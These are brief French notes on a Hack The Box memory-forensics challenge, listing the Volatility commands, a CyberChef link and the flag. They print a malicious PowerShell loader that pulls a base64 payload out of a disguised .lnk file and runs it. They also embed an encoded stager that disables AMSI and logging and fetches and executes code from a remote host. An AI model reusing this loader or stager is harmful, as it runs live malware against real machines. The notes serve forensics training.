#use volatility

lien utile :

https://hello.global.ntt/en-us/insights/blog/
https://www.andreafortuna.org/2018/03/02/volatility-tips-extract-text-typed-in-a-notepad-window-from-a-windows-memory-dump/

$stP,$siP=3230,9676;$f='resume.pdf.lnk';if(-not(Test-Path $f)){$x=Get-ChildItem -Path $env:temp -Filter $f -Recurse;[IO.Directory]::SetCurrentDirectory($x.DirectoryName);}$lnk=New-Object IO.FileStream $f,'Open','Read','ReadWrite';$b64=New-Object byte[]($siP);$lnk.Seek($stP,[IO.SeekOrigin]::Begin);$lnk.Read($b64,0,$siP);$b64=[Convert]::FromBase64CharArray($b64,0,$b64.Length);$scB=[Text.Encoding]::Unicode.GetString($b64);iex $scB;

commande utile ctf :

-vol.py --profile=Win7SP1x64 -f flounder-pc-memdump.elf pslist
-vol.py --profile=Win7SP1x64 -f flounder-pc-memdump.elf consoles
-vol.py --profile=Win7SP1x64 -f flounder-pc-memdump.elf memdump -p 2752 --dump-dir /tmp
-strings 2752.dmp | grep powershell.exe

puis decode en base64 avec cyberchef sinon sa fait de la merde

lien decode base64 cyberchef :
https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=cG93ZXJzaGVsbC5leGUiIC1ub1AgLXN0YSAtdyAxIC1lbmMgSkFCSEFISUFid0JWQUZBQVVBQlBBRXdBYVFCREFGa0FVd0JGQUhRQWRBQkpBRTRBUndCekFDQUFQUUFnQUZzQWNnQkZBRVlBWFFBdUFFRUFVd0J6QUdVQVRRQkNBRXdBV1FBdUFFY0FSUUIwQUZRQWVRQndBRVVBS0FBbkFGTUFlUUJ6QUhRQVpRQnRBQzRBVFFCaEFHNEFZUUJuQUdVQWJRQmxBRzRBZEFBdUFFRUFkUUIwQUc4QWJRQmhBSFFBYVFCdkFHNEFMZ0JWQUhRQWFRQnNBSE1BSndBcEFDNEFJZ0JIQUVVQWRBQkdBRWtBUlFCZ0FHd0FaQUFpQUNnQUp3QmpBR0VBWXdCb0FHVUFaQUJIQUhJQWJ3QjFBSEFBVUFCdkFHd0FhUUJqQUhrQVV3QmxBSFFBZEFCcEFHNEFad0J6QUNjQUxBQWdBQ2NBVGdBbkFDc0FKd0J2QUc0QVVBQjFBR0lBYkFCcEFHTUFMQUJUQUhRQVlRQjBBR2tBWXdBbkFDa0FMZ0JIQUVVQVZBQldBR0VBYkFCVkFHVUFLQUFrQUc0QWRRQnNBRXdBS1FBN0FDUUFSd0JTQUc4QWRRQlFBRkFBVHdCc0FFa0FRd0I1QUZNQVpRQlVBRlFBYVFCT0FHY0FVd0JiQUNjQVV3QmpBSElBYVFCd0FIUUFRZ0FuQUNzQUp3QnNBRzhBWXdCckFFd0Fid0JuQUdjQWFRQnVBR2NBSndCZEFGc0FKd0JGQUc0QVlRQmlBR3dBWlFCVEFHTUFjZ0JwQUhBQWRBQkNBQ2NBS3dBbkFHd0Fid0JqQUdzQVRBQnZBR2NBWndCcEFHNEFad0FuQUYwQUlBQTlBQ0FBTUFBN0FDUUFSd0JTQUc4QWRRQlFBRkFBVHdCTUFFa0FRd0JaQUZNQVJRQjBBRlFBYVFCdUFHY0FVd0JiQUNjQVV3QmpBSElBYVFCd0FIUUFRZ0FuQUNzQUp3QnNBRzhBWXdCckFFd0Fid0JuQUdjQWFRQnVBR2NBSndCZEFGc0FKd0JGQUc0QVlRQmlBR3dBWlFCVEFHTUFjZ0JwQUhBQWRBQkNBR3dBYndCakFHc0FTUUJ1QUhZQWJ3QmpBR0VBZEFCcEFHOEFiZ0JNQUc4QVp3Qm5BR2tBYmdCbkFDY0FYUUFnQUQwQUlBQXdBRHNBV3dCU0FHVUFaZ0JkQUM0QVFRQnpBRk1BWlFCdEFFSUFiQUI1QUM0QVJ3QmxBRlFBVkFCNUFGQUFSUUFvQUNjQVV3QjVBSE1BZEFCbEFHMEFMZ0JOQUdFQWJnQmhBR2NBWlFCdEFHVUFiZ0IwQUM0QVFRQjFBSFFBYndCdEFHRUFkQUJwQUc4QWJnQXVBRUVBYlFCekFHa0FWUUIwQUdrQWJBQnpBQ2NBS1FCOEFEOEFld0FrQUY4QWZRQjhBQ1VBZXdBa0FGOEFMZ0JIQUVVQWRBQkdBR2tBWlFCTUFHUUFLQUFuQUdFQWJRQnpBR2tBU1FCdUFHa0FkQUJHQUdFQWFRQnNBR1VBWkFBbkFDd0FKd0JPQUc4QWJnQlFBSFVBWWdCc0FHa0FZd0FzQUZNQWRBQmhBSFFBYVFCakFDY0FLUUF1QUZNQVJRQlVBRllBWVFCTUFIVUFSUUFvQUNRQVRnQjFBR3dBVEFBc0FDUUFWQUJ5QUhVQVpRQXBBSDBBT3dCYkFGTUFlUUJ6QUZRQVpRQnRBQzRBVGdCbEFGUUFMZ0JUQUVVQWNnQldBRWtBWXdCbEFGQUFUd0JKQUc0QWRBQk5BRUVBYmdCQkFHY0FSUUJTQUYwQU9nQTZBRVVBZUFCd0FFVUFZd0IwQURFQU1BQXdBRU1BVHdCdUFGUUFhUUJ1QUhVQVJRQTlBREFBT3dBa0FGY0FRd0E5QUU0QVJRQlhBQzBBVHdCQ0FHb0FSUUJqQUZRQUlBQlRBSGtBY3dCVUFFVUFUUUF1QUU0QVJRQjBBQzRBVndCbEFFSUFRd0JzQUVrQVJRQnVBSFFBT3dBa0FIVUFQUUFuQUUwQWJ3QjZBR2tBYkFCc0FHRUFMd0ExQUM0QU1BQWdBQ2dBVndCcEFHNEFaQUJ2QUhjQWN3QWdBRTRBVkFBZ0FEWUFMZ0F4QURzQUlBQlhBRThBVndBMkFEUUFPd0FnQUZRQWNnQnBBR1FBWlFCdUFIUUFMd0EzQUM0QU1BQTdBQ0FBY2dCMkFEb0FNUUF4QUM0QU1BQXBBQ0FBYkFCcEFHc0FaUUFnQUVjQVpRQmpBR3NBYndBbkFEc0FKQUIzQUVNQUxnQklBR1VBWVFCRUFHVUFjZ0JUQUM0QVFRQmtBR1FBS0FBbkFGVUFjd0JsQUhJQUxRQkJBR2NBWlFCdUFIUUFKd0FzQUNRQWRRQXBBRHNBSkFCWEFHTUFMZ0JRQUZJQWJ3QllBSGtBUFFCYkFGTUFlUUJ6QUZRQVpRQk5BQzRBVGdCRkFGUUFMZ0JYQUdVQVlnQlNBR1VBY1FCMUFFVUFjd0IwQUYwQU9nQTZBRVFBWlFCbUFHRUFWUUJNQUhRQVZ3QmxBRUlBVUFCU0FFOEFXQUJaQURzQUpBQjNBRU1BTGdCUUFGSUFid0JZQUZrQUxnQkRBRklBUlFCRUFHVUFUZ0IwQUVrQVlRQk1BRk1BSUFBOUFDQUFXd0JUQUZrQVV3QlVBR1VBVFFBdUFFNEFSUUJVQUM0QVF3QnlBR1VBUkFCRkFHNEFWQUJwQUdFQVRBQkRBR0VBUXdCb0FHVUFYUUE2QURvQVJBQmxBRVlBWVFCMUFFd0FWQUJPQUVVQWRBQjNBRThBY2dCckFFTUFjZ0JsQUdRQVpRQnVBSFFBYVFCQkFHd0FVd0E3QUNRQVN3QTlBRnNBVXdCWkFGTUFkQUJGQUUwQUxnQlVBR1VBZUFCMEFDNEFSUUJPQUVNQVR3QkVBRWtBYmdCbkFGMEFPZ0E2QUVFQVV3QkRBRWtBU1FBdUFFY0FSUUIwQUVJQWVRQjBBRVVBY3dBb0FDY0FSUUF4QUdjQVRRQkhBR1FBWmdCVUFFQUFaUUJ2QUU0QVBnQjRBRGtBZXdCZEFESUFSZ0EzQUNzQVlnQnpBRThBYmdBMEFDOEFVd0JwQUZFQWNnQjNBQ2NBS1FBN0FDUUFVZ0E5QUhzQUpBQkVBQ3dBSkFCTEFEMEFKQUJCQUhJQVp3QlRBRHNBSkFCVEFEMEFNQUF1QUM0QU1nQTFBRFVBT3dBd0FDNEFMZ0F5QURVQU5RQjhBQ1VBZXdBa0FFb0FQUUFvQUNRQVNnQXJBQ1FBVXdCYkFDUUFYd0JkQUNzQUpBQkxBRnNBSkFCZkFDVUFKQUJMQUM0QVF3QnZBSFVBYmdCVUFGMEFLUUFsQURJQU5RQTJBRHNBSkFCVEFGc0FKQUJmQUYwQUxBQWtBRk1BV3dBa0FFb0FYUUE5QUNRQVV3QmJBQ1FBU2dCZEFDd0FKQUJUQUZzQUpBQmZBRjBBZlFBN0FDUUFSQUI4QUNVQWV3QWtBRWtBUFFBb0FDUUFTUUFyQURFQUtRQWxBRElBTlFBMkFEc0FKQUJJQUQwQUtBQWtBRWdBS3dBa0FGTUFXd0FrQUVrQVhRQXBBQ1VBTWdBMUFEWUFPd0FrQUZNQVd3QWtBRWtBWFFBc0FDUUFVd0JiQUNRQVNBQmRBRDBBSkFCVEFGc0FKQUJJQUYwQUxBQWtBRk1BV3dBa0FFa0FYUUE3QUNRQVh3QXRBR0lBZUFCdkFGSUFKQUJUQUZzQUtBQWtBRk1BV3dBa0FFa0FYUUFyQUNRQVV3QmJBQ1FBU0FCZEFDa0FKUUF5QURVQU5nQmRBSDBBZlFBN0FDUUFkd0JqQUM0QVNBQkZBRUVBWkFCRkFISUFjd0F1QUVFQVJBQkVBQ2dBSWdCREFHOEFid0JyQUdrQVpRQWlBQ3dBSWdCekFHVUFjd0J6QUdrQWJ3QnVBRDBBVFFCREFHRUFhQUIxQUZFQVZnQm1BSG9BTUFCNUFFMEFOZ0JXQUVJQVpRQTRBR1lBZWdCV0FEa0FkQUE1QUdvQWJ3QnRBRzhBUFFBaUFDa0FPd0FrQUhNQVpRQnlBRDBBSndCb0FIUUFkQUJ3QURvQUx3QXZBREVBTUFBdUFERUFNQUF1QURrQU9RQXVBRFVBTlFBNkFEZ0FNQUFuQURzQUpBQjBBRDBBSndBdkFHd0Fid0JuQUdrQWJnQXZBSEFBY2dCdkFHTUFaUUJ6QUhNQUxnQndBR2dBY0FBbkFEc0FKQUJtQUd3QVlRQm5BRDBBSndCSUFGUUFRZ0I3QUNRQVh3QnFBREFBUndCZkFIa0FNQUIxQUZJQVh3Qk5BRE1BYlFBd0FISUFXUUJmQUNRQWZRQW5BRHNBSkFCRUFHRUFkQUJCQUQwQUpBQlhBRU1BTGdCRUFHOEFWd0JPQUV3QWJ3QmhBRVFBUkFCQkFGUUFRUUFvQUNRQVV3QmxBRklBS3dBa0FIUUFLUUE3QUNRQWFRQjJBRDBBSkFCa0FHRUFWQUJCQUZzQU1BQXVBQzRBTXdCZEFEc0FKQUJFQUVFQWRBQmhBRDBBSkFCRUFHRUFWQUJoQUZzQU5BQXVBQzRBSkFCRUFFRUFkQUJoQUM0QVRBQmxBRzRBUndCVUFFZ0FYUUE3QUMwQVNnQlBBRWtBVGdCYkFFTUFTQUJCQUhJQVd3QmRBRjBBS0FBbUFDQUFKQUJTQUNBQUpBQmtBR0VBZEFCQkFDQUFLQUFrQUVrQVZnQXJBQ1FBU3dBcEFDa0FmQUJKQUVVQVdBQT0

flag : HTB{$_j0G_y0uR_M3m0rY_$}